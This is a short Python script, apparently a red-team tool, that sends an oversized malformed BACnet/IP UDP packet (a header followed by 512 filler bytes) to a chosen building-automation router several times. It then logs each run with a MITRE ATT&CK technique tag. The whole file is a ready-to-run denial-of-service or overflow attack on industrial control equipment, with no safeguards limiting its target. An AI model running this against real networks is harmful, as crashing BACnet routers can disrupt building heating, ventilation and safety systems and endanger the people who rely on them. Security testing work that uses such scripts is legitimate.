#!/usr/bin/env python3

import argparse
import socket
import json
import os
from datetime import datetime
import time

LOG_FILE = "results/bacnet_overflow_log.json"
MITRE_TTP = "T1211"

def log(entry):
    os.makedirs("results", exist_ok=True)
    try:
        with open(LOG_FILE, "r") as f:
            data = json.load(f)
    except:
        data = []
    data.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=2)

def send_bacnet_overflow(ip, port=47808, repeat=3):
    payload = b'\x81\x0a\x00\xff' + b'A' * 512
    for _ in range(repeat):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(payload, (ip, port))
            sock.close()
            time.sleep(1)
        except:
            pass

def main():
    parser = argparse.ArgumentParser(description="BACnet Router Overflow")
    parser.add_argument("--ip", required=True, help="Target BACnet router IP")
    parser.add_argument("--port", type=int, default=47808)
    parser.add_argument("--repeat", type=int, default=3)
    args = parser.parse_args()

    send_bacnet_overflow(args.ip, args.port, args.repeat)
    log({
        "timestamp": datetime.utcnow().isoformat(),
        "target_ip": args.ip,
        "port": args.port,
        "repeat": args.repeat,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    main()
